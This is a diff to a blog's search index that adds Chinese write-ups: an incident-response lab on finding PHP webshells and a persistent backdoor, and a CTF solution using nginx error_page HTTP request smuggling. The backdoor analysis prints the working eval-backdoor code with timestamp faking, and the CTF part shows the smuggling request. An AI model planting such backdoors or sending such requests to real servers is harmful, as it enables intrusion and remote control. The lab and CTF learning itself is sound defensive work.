@@ -2997,7 +2997,15 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted&quot; /var/log/auth.log.1</span><br></pre></td></tr></table></figure>
 
 <p>至此关于Linux的日志分析就告一段落，建议学习的时候多进行手撸命令而不是ctrl+c和ctrl+v复制粘贴，同时感谢大佬的wp让我学到了很多知识，wp真的很细！！！</p>
-<h3 id="第一章-应急响应-webshell查杀"><a href="#第一章-应急响应-webshell查杀" class="headerlink" title="第一章 应急响应-webshell查杀"></a>第一章 应急响应-webshell查杀</h3><h4 id="什么是webshell应急响应"><a href="#什么是webshell应急响应" class="headerlink" title="什么是webshell应急响应"></a>什么是webshell应急响应</h4><p>简单官方一点：WebShell应急响应是指在检测到WebShell（恶意Web脚本）攻击后，采取一系列措施来控制、消除威胁，并恢复受影响的系统和服务。WebShell是一种常见的攻击手段，攻击者通过上传或注入恶意脚本到Web服务器上，从而获得对服务器的远程控制权限，而我们需要做的就是找到问题所在根源并且解决掉它。</p>
+<h3 id="第一章-应急响应-webshell查杀"><a href="#第一章-应急响应-webshell查杀" class="headerlink" title="第一章 应急响应-webshell查杀"></a>第一章 应急响应-webshell查杀</h3><h4 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h4><p><strong>Webshell</strong> 是一种通过 Web 服务器接口提供命令执行能力的恶意脚本。它通常被攻击者上传到受入侵的 Web 服务器上，以便远程执行命令和控制服务器。</p>
+<p>特点：</p>
+<ul>
+<li><strong>脚本语言</strong>：通常用 PHP、ASP、JSP、Python 等编写，依赖于目标服务器的环境。</li>
+<li><strong>功能</strong>：文件管理、命令执行、数据库操作、网络连接、权限提升等。</li>
+<li><strong>隐蔽性</strong>：通常伪装成正常文件或与网站现有文件混在一起，可能被混淆以逃避检测。</li>
+<li><strong>通信</strong>：使用 HTTP&#x2F;HTTPS 协议进行通信，易于隐藏在普通网络流量中。</li>
+</ul>
+<h4 id="什么是webshell应急响应"><a href="#什么是webshell应急响应" class="headerlink" title="什么是webshell应急响应"></a>什么是webshell应急响应</h4><p>简单官方一点：WebShell应急响应是指在检测到WebShell（恶意Web脚本）攻击后，采取一系列措施来控制、消除威胁，并恢复受影响的系统和服务。WebShell是一种常见的攻击手段，攻击者通过上传或注入恶意脚本到Web服务器上，从而获得对服务器的远程控制权限，而我们需要做的就是找到问题所在根源并且解决掉它。</p>
 <h4 id="常规后门查杀"><a href="#常规后门查杀" class="headerlink" title="常规后门查杀"></a>常规后门查杀</h4><p>1.1、静态检测</p>
 <p>我们可以查找一些特殊后缀结尾的文件。例如：.asp、.php、.jsp、.aspx。</p>
 <p>然后再从这类文件中查找后门的特征码，特征值，危险函数来查找webshell，例如查找内容含有exec()、eval()、system()的文件。</p>
@@ -3223,12 +3231,247 @@
 <li>外部输入：</li>
 </ul>
 <p>使用$_GET参数来控制代码行为。通过外部输入来决定代码逻辑，使得攻击者可以远程控制服务器，执行任意PHP代码。</p>
+<h3 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h3><h4 id="什么是木马"><a href="#什么是木马" class="headerlink" title="什么是木马?"></a>什么是木马?</h4><p><strong>木马（Trojan Horse）</strong> 是一种伪装成合法软件的恶意程序，其目的是为攻击者提供对受感染机器的远程访问。</p>
+<p>特点：</p>
+<ul>
+<li><strong>伪装性</strong>：通常捆绑或伪装成合法应用程序。</li>
+<li><strong>后门功能</strong>：允许攻击者对系统进行远程控制。</li>
+<li><strong>多功能性</strong>：可以包括键盘记录、屏幕截图、文件传输、权限提升等功能。</li>
+<li><strong>持续性</strong>：常常设法在系统重启后继续运行。</li>
+</ul>
+<h4 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h4><h4 id="什么是linux入侵排查"><a href="#什么是linux入侵排查" class="headerlink" title="什么是linux入侵排查"></a>什么是linux入侵排查</h4><p><strong>Linux入侵排查</strong>是应急响应的一部分，专门针对Linux系统进行安全事件的调查和分析。</p>
+<p>具体的排查方法我就不赘述了，上面两次也写过了</p>
+<h4 id="两种方法的好处"><a href="#两种方法的好处" class="headerlink" title="两种方法的好处"></a>两种方法的好处</h4><p>1.手工排查的好处</p>
+<ul>
+<li>灵活性高：</li>
+</ul>
+<p>手工排查能够根据具体情况和需求进行灵活调整，针对特定的可疑活动进行详细分析。</p>
+<ul>
+<li>深度理解：</li>
+</ul>
+<p>手工排查需要深入理解系统和日志，这有助于安全人员提高对系统和安全事件的理解和认识。</p>
+<ul>
+<li>精确性强：</li>
+</ul>
+<p>手工排查可以通过逐行分析日志和系统信息，发现工具可能遗漏的细微线索和异常行为。</p>
+<ul>
+<li>适应性强：</li>
+</ul>
+<p>对于新型威胁和未知攻击，手工排查可以快速调整策略进行应对，而不需要依赖工具的更新和支持。<br>2.工具排查的好处</p>
+<ul>
+<li>效率高：</li>
+</ul>
+<p>工具可以快速处理大量数据和日志，节省时间，提高分析效率。</p>
+<ul>
+<li>全面性：</li>
+</ul>
+<p>工具能够自动化地扫描和分析系统的各个方面，提供全面的检测和报告。</p>
+<ul>
+<li>重复性强：</li>
+</ul>
+<p>工具可以进行重复性工作，减少人为错误和疏漏，提高一致性和准确性。</p>
+<ul>
+<li>集成性好：</li>
+</ul>
+<p>现代安全工具通常集成了多种功能，如日志分析、恶意软件检测、漏洞扫描等，提供一站式解决方案。</p>
+<h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><h5 id="问题1-web目录存在木马，请找到木马的密码提交"><a href="#问题1-web目录存在木马，请找到木马的密码提交" class="headerlink" title="问题1:web目录存在木马，请找到木马的密码提交"></a>问题1:web目录存在木马，请找到木马的密码提交</h5><p>需要我们找到这个木马并把木马的密码提交</p>
+<p>先进入&#x2F;var&#x2F;www&#x2F;html目录查看木马，跟上面的基本查看webshell是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find ./ -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117172024501-1731835258893-1.png" alt="image-20241117172024501"></p>
+<p>可以看出查出三个后缀为.php的文件，题目要求我们把木马的密码提交，就这三个文件很明显嘛，不是pass就是1咯</p>
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>一句话木马是一种极为简短且隐蔽的恶意代码，通常嵌入到网站的 PHP 文件中，用于远程执行任意代码或命令。这种木马之所以被称为“一句话木马”，是因为它们通常只包含一行代码，但功能强大且危险。</p>
+<p>一句话木马特征</p>
+<ul>
+<li>简短：通常只有一行代码，易于隐藏和注入。</li>
+<li>使用 eval 函数：利用 eval 函数执行传入的 PHP 代码。</li>
+<li>通过 HTTP 参数传递代码：常见的方式是通过 GET 或 POST 请求参数传递要执行的代码。</li>
+<li>基础验证：一些一句话木马会有简单的验证机制，比如检查一个参数的值是否符合某个条件。</li>
+</ul>
+<p>可以看到1.php中木马的密码是1，直接提交flag就行了</p>
+<h5 id="问题2-服务器疑似存在不死马，请找到不死马的密码提交"><a href="#问题2-服务器疑似存在不死马，请找到不死马的密码提交" class="headerlink" title="问题2:服务器疑似存在不死马，请找到不死马的密码提交"></a>问题2:服务器疑似存在不死马，请找到不死马的密码提交</h5><h4 id="什么是不死马"><a href="#什么是不死马" class="headerlink" title="什么是不死马"></a>什么是不死马</h4><p>不死马（Persistence Backdoor）是一种能够在系统中保持长期存在并持续运行的恶意软件，即使系统重启或某些安全措施生效后，它依然能够恢复运行。不死马通常会通过修改系统关键配置、添加定时任务、劫持系统进程等手段来实现持久化。</p>
+<p>简单来说；</p>
+<p>不死马是一种具有持久性的后门程序，它被设计用来在受感染的系统上长期驻留并保持活跃。其目的是确保攻击者对系统的访问不会因为系统重启或其他干预措施而中断。</p>
+<p>不死马特征</p>
+<ul>
+<li>持久性：</li>
+</ul>
+<p>自启动：通过修改系统启动项、服务、计划任务等方式实现自启动。</p>
+<p>文件隐藏：使用技术手段隐藏自身文件，避免被发现和删除。</p>
+<p>多重存在：可能在多个位置部署副本，增强存活能力。</p>
+<ul>
+<li>隐蔽性：</li>
+</ul>
+<p>低调运行：以低优先级运行，不占用过多系统资源，减少被注意的可能。</p>
+<p>多态性：定期更改自身代码或行为模式，规避签名检测。</p>
+<p>日志清除：清除自身操作痕迹，减少被追踪的可能。</p>
+<ul>
+<li>多样化的保持机制：</li>
+</ul>
+<p>启动项：在 Windows 中，可以修改注册表中的启动项，在 Linux 中，可以修改 rc.local 或 crontab。<br>服务劫持：创建或劫持合法的系统服务。<br>计划任务：在系统计划任务中添加恶意任务。</p>
+<p>因为我们刚刚找到了三个木马，所以我们一个个排查一下</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117173136363.png" alt="image-20241117173136363"></p>
+<p>这里可以看到index.php中在<code>/var/www/html/</code> 目录下创建一个名为 <code>.shell.php</code> 的后门文件，并伪造其时间戳以试图隐藏其存在。该后门文件包含恶意代码，通过 <code>md5</code> 哈希验证密码后，执行传入的命令。这种后门文件可以被攻击者用来远程执行任意命令，从而完全控制服务器。</p>
+<p>代码解释:</p>
+<ul>
+<li>定义后门文件路径：</li>
+</ul>
+<p>$file &#x3D; ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;.shell.php’;</p>
+<p>$file 变量定义了后门文件的存放路径 &#x2F;var&#x2F;www&#x2F;html&#x2F;.shell.php。</p>
+<ul>
+<li>定义后门代码：</li>
+</ul>
+<p>$code &#x3D; ‘<?php if(md5($_POST["pass"])=="5d41402abc4b2a76b9719d911017c592"){@eval($_POST[cmd]);}?>‘;</p>
+<p>$code 变量定义了后门代码。</p>
+<p>该代码通过 md5 哈希验证 POST 请求中的密码（pass 参数），如果匹配，则执行 POST 请求中的命令（cmd 参数）。</p>
+<ul>
+<li>写入后门文件：</li>
+</ul>
+<p>file_put_contents($file, $code);</p>
+<p>使用 file_put_contents 函数将后门代码写入到 $file 指定的文件路径中，即创建或覆盖 .shell.php 文件。</p>
+<ul>
+<li>伪造文件时间戳：</li>
+</ul>
+<p>system(‘touch -m -d “2021-01-01 00:00:01” .shell.php’);</p>
+<p>使用 system 函数执行 touch 命令，修改 .shell.php 文件的修改时间为 2021-01-01 00:00:01，以伪造文件的修改时间，试图隐藏其创建和修改痕迹。</p>
+<ul>
+<li>微小延时：</li>
+</ul>
+<p>usleep(3000);</p>
+<p>使用 usleep 函数增加 3000 微秒（3 毫秒）的延时，虽然这个延时很短，但可能用于调节执行的节奏，以掩盖其操作痕迹。</p>
+<p>所以这一套下来基本就是可以确认.shell.php文件就是由这个文件生成的，并且每隔usleep(3000)就生成一个新文件，所以达到了不死马的条件；</p>
+<p>那既然我们不死马知道是谁了，并且也知道了是由谁生成不死马，那密码肯定就是那串MD5；那我们拿去解密一下就可以拿到flag了</p>
+<h5 id="问题3-不死马是通过哪个文件生成的，请提交文件名"><a href="#问题3-不死马是通过哪个文件生成的，请提交文件名" class="headerlink" title="问题3:不死马是通过哪个文件生成的，请提交文件名"></a>问题3:不死马是通过哪个文件生成的，请提交文件名</h5><p>上面就可以看到了不死马是在index.php中进行创建生成的，直接交文件名就行</p>
+<h5 id="问题4：黑客留下了木马文件，请找出黑客的服务器ip提交"><a href="#问题4：黑客留下了木马文件，请找出黑客的服务器ip提交" class="headerlink" title="问题4：黑客留下了木马文件，请找出黑客的服务器ip提交"></a>问题4：黑客留下了木马文件，请找出黑客的服务器ip提交</h5><p>因为我们需要找出黑客的服务器ip，因为一个黑客如果需要传入木马文件，肯定需要先攻破我们的服务器，那么一定会有进行登录的操作，也就会留下相应的日志文件。这就涉及到上面第一部分的内容了，去查找暴力破解登录的痕迹</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117174156424.png" alt="image-20241117174156424"></p>
+<p>但是我们这里搜查了两个都没得回显，我们只能返回刚刚的目录检查一下可疑文件可以看到有一个‘shell(1).elf’</p>
+<p>首先我们对这个文件进行提权，使所有用户都能无限制的访问此文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 &#x27;shell(1).elf&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们运行，让他产生外联行为</p>
+<p>.&#x2F;‘shell(1).elf’</p>
+<p>但是这个时候我们的终端是会卡住的，需要另外起一个终端并运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure>
+
+<h4 id="netstat-命令"><a href="#netstat-命令" class="headerlink" title="netstat 命令"></a>netstat 命令</h4><p>netstat 是一个网络工具，用于显示网络连接、路由表、接口统计信息、伪装连接和多播成员信息。</p>
+<p>选项和参数</p>
+<p>-a：显示所有连接中的端口，包括监听和非监听。<br>-n：以数字形式显示地址和端口号，而不是将其解析为主机名或服务名。<br>-t：显示 TCP 连接。<br>-l：显示监听状态的套接字。<br>-p：显示使用每个套接字的程序。</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117174948473.png" alt="image-20241117174948473"></p>
+<p>字段解释</p>
+<ul>
+<li>Proto：协议（Protocol）</li>
+</ul>
+<p>显示协议类型，常见的有 tcp 和 udp。</p>
+<ul>
+<li>Recv-Q：接收队列（Receive Queue）</li>
+</ul>
+<p>显示接收队列的字节数。接收队列中的字节数是应用程序还未处理的接收数据。</p>
+<ul>
+<li>Send-Q：发送队列（Send Queue）</li>
+</ul>
+<p>显示发送队列的字节数。发送队列中的字节数是已经被应用程序发送，但还未被远程主机接收的字节数。</p>
+<ul>
+<li>Local Address：本地地址</li>
+</ul>
+<p>显示本地端的 IP 地址和端口号。例如：0.0.0.0:80 表示本地所有 IP 地址上的 80 端口。</p>
+<ul>
+<li>Foreign Address：远程地址</li>
+</ul>
+<p>显示远程端的 IP 地址和端口号。例如：192.168.1.1:12345 表示远程 IP 为 192.168.1.1 的 12345 端口。</p>
+<ul>
+<li>State：状态</li>
+</ul>
+<p>显示连接的状态。常见状态有：</p>
+<p>LISTEN：正在监听连接。</p>
+<p>ESTABLISHED：已建立连接。</p>
+<p>CLOSE_WAIT：等待关闭连接。</p>
+<p>TIME_WAIT：等待足够的时间以确保远程主机收到关闭请求。</p>
+<ul>
+<li>PID&#x2F;Program name：进程 ID 和程序名</li>
+</ul>
+<p>显示使用该连接的进程的进程 ID 和程序名。例如：1234&#x2F;nginx 表示进程 ID 为 1234 的 nginx 程序。</p>
+<p>然后我们找到.shell.elf文件的那一行就可以看到我们想要的的信息了</p>
+<h5 id="问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交"><a href="#问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交" class="headerlink" title="问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交"></a>问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交</h5><h4 id="什么是监听端口号？"><a href="#什么是监听端口号？" class="headerlink" title="什么是监听端口号？"></a>什么是监听端口号？</h4><p>监听端口号（Listening Port）是网络通信中用于等待和接收传入连接请求的端口号。服务器或服务在特定端口上监听，以便与客户端建立连接。这种机制确保了网络应用程序能够接收和处理来自其他网络设备的请求。</p>
+<p>基本概念</p>
+<p>端口号：计算机网络中的端口号是用于标识特定应用程序或进程的逻辑端点。端口号的范围是0到65535，其中0到1023为系统保留端口，一般用于知名服务。<br>监听（Listening）：当一个应用程序或服务在某个端口上“监听”时，它在等待并准备接受来自该端口的连接请求。</p>
+<p>从上面的图里面可以看到是3333端口，直接提交就行了</p>
+<h3 id="工具排查"><a href="#工具排查" class="headerlink" title="工具排查"></a>工具排查</h3><p>由于我们上面的都是自己手动排查，相对来说比较繁琐效率也低，这时候我们可以用工具进行排查，例如河马和d盾，我们直接把文件下载下来然后放d盾或者相关的web查杀工具里进行扫描查看就可以了，这里简单高效</p>
+<p>相关命令</p>
+<p>下载命令:tar -czvf 目录名字.tar.gz .&#x2F;</p>
+<ul>
+<li><code>tar</code>: Tape Archive 的缩写，是一个在 Unix 和类 Unix 系统中用于文件归档的工具。它可以将多个文件和目录打包成一个单一的归档文件。</li>
+<li><code>-c</code>: 选项表示创建一个新的归档文件（create）。</li>
+<li><code>-z</code>: 选项表示通过 <code>gzip</code> 来压缩归档文件。这样可以使生成的归档文件体积更小。</li>
+<li><code>-v</code>: 选项表示详细模式（verbose）。在处理文件的过程中，会将每个被归档的文件名显示在终端上，让用户了解正在处理哪些文件。</li>
+<li><code>-f html.tar.gz</code>: 选项中的 <code>-f</code> 用于指定输出归档文件的名称。在这个例子中，生成的压缩归档文件将被命名为 <code>html.tar.gz</code>。</li>
+<li><code>./</code>: 这是指定要归档的文件或目录路径。在这个例子中，<code>./</code> 表示归档当前目录下的所有文件和目录。</li>
+</ul>
+<p>以入侵排查为例，我们扫描出来的结果就是</p>
+<p>id      级别  大小       CRC        修改时间             文件 (说明)</p>
+<hr>
+<p> 00001   4     88         70B2B130   21-01-01 08:00:01    .shell.php    『Eval后门 {参数:$_POST[cmd]}』 _</p>
+<p>00002   4     24         F46D132A   23-08-03 10:15:23    \1.php         『Eval后门 {参数:$_POST[1]}』</p>
+<p>00003   1     655360     A3580725   23-08-03 10:45:11    \html\1.tar         『可疑文件』 </p>
+<p>00004   1     722        17D041A4   23-08-03 10:40:18    \html\index.php     『可疑文件』</p>
 ]]></content>
       <categories>
         <category>玄机第一章应急响应</category>
       </categories>
       <tags>
         <tag>Linux日志分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蜀道山高校联合公益赛</title>
+    <url>/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="my-site"><a href="#my-site" class="headerlink" title="my_site"></a><strong>my_site</strong></h1><p>打开是一个登录界面，我们注册个账号密码进行登录后发现是一个message board页面</p>
+<p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117114753220.png" alt="image-20241117114753220"></p>
+<h1 id="海关警察训练平台"><a href="#海关警察训练平台" class="headerlink" title="海关警察训练平台"></a><strong>海关警察训练平台</strong></h1><p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117144548622.png" alt="image-20241117144548622"></p>
+<p>查看一下源代码</p>
+<p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117151610382.png" alt="image-20241117151610382"></p>
+<p>这里可以看到当flag&#x3D;&#x3D;&#x3D;1 的时候会导航到里面的url，也就是url&#x2F;error，那我们访问一下看看</p>
+<p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117152027775.png" alt="image-20241117152027775"></p>
+<p>发现出现按302跳转了，跳到了当前这个路径，最后可以提示是nginx的服务器，猜测是不是服务器的版本cve漏洞</p>
+<p>在开发者模式中看一下当前服务器版本</p>
+<p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117152215972.png" alt="image-20241117152215972"></p>
+<p>发现不是nginx的服务器而是apache的服务器，而且还没有版本号</p>
+<p>我们返回去看一下原来的服务器版本</p>
+<p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117152322535.png" alt="image-20241117152322535"></p>
+<p>发现这时候是nginx&#x2F;1.17.6的版本号</p>
+<p>搜一下这个版本的cve，发现有一个CVE-2019-20372跟我们的漏洞有点像</p>
+<p><a href="https://www.cnblogs.com/null1433/p/12778026.html">https://www.cnblogs.com/null1433/p/12778026.html</a></p>
+<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。而题目中的flag在内网的地址应该就是我们未授权的web页面</p>
+<h2 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2><p>HTTP请求走私攻击，顾名思义，就会像走私一样在一个HTTP请求包中夹带另一个或多个HTTP请求包，在前端看来是一个HTTP请求包，但是到了后端可能会被解析器分解开从而导致夹带的HTTP请求包也会被解析，最终可以导致未授权访问敏感数据或攻击其他用户。</p>
+<p>说白了就是在一个包里面发两个请求包让后端进行解析去访问我们需要访问的web页面</p>
+<h3 id="HTTP请求走私漏洞如何产生？"><a href="#HTTP请求走私漏洞如何产生？" class="headerlink" title="HTTP请求走私漏洞如何产生？"></a>HTTP请求走私漏洞如何产生？</h3><p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。</p>
+<p>该<code>Content-Length</code>头是直接的：它指定消息体的以字节为单位的长度。例如:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure>
+
+<p>该<code>Transfer-Encoding</code>首标可以被用于指定该消息体的用途分块编码。这意味着消息正文包含一个或多个数据块。每个块均由以字节为单位的块大小（以十六进制表示）组成，后跟换行符，然后是块内容。该消息以大小为零的块终止。例如</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /search HTTP/<span class="number">1.1</span></span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="HTTP请求走私类型"><a href="#HTTP请求走私类型" class="headerlink" title="HTTP请求走私类型"></a>HTTP请求走私类型</h3><h4 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h4><p>前端代理服务器允许GET请求携带请求体，但后端服务器不允许GET请求携带请求体，则后端服务器会忽略掉GET请求中的<code>Content-Length</code>，不进行处理，从而导致请求走私。</p>
+<p>我们可以向服务器发起以下请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /a HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 56</span><br><span class="line">GET /_hidden/index.html HTTP/1.1</span><br><span class="line">Host: notlocalhost</span><br></pre></td></tr></table></figure>
+
+<p>我们看一下服务器是怎么处理的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx/1.17.6</span><br><span class="line">Date: Fri, 06 Dec 2019 18:23:33 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http://example.org</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;302 Found&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;302 Found&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.17.6&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.17.6</span><br><span class="line">Date: Fri, 06 Dec 2019 18:23:33 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 22</span><br><span class="line">Connection: keep-alive</span><br><span class="line">This should be hidden!</span><br></pre></td></tr></table></figure>
+
+<p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求。</p>
+<p>上面只讲了跟本道题有关的类型，其他的类型我直接引入一位师傅的文章了，方便以后随时打开看</p>
+<p><a href="https://www.freebuf.com/articles/web/243652.html">详细笔记+实验：HTTP请求走私 - FreeBuf网络安全行业门户</a></p>
+<p>解题</p>
+<p>直接用bp发包就行</p>
+<p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117160428914.png" alt="image-20241117160428914"></p>
+<p>不过我一开始没跑出来，后面发现少了两个\r\n,我们可以打开\n看看</p>
+<p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117161959025.png" alt="image-20241117161959025"></p>
+<h1 id="奶龙牌WAF"><a href="#奶龙牌WAF" class="headerlink" title="奶龙牌WAF"></a><strong>奶龙牌WAF</strong></h1><p><img src="/./../image/achieve/202411/%E8%9C%80%E9%81%93%E5%B1%B1%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20241117162514853.png" alt="image-20241117162514853"></p>
+]]></content>
+      <categories>
+        <category>赛题wp</category>
+      </categories>
+      <tags>
+        <tag>蜀道山高校联合公益赛</tag>
       </tags>
   </entry>
 </search>
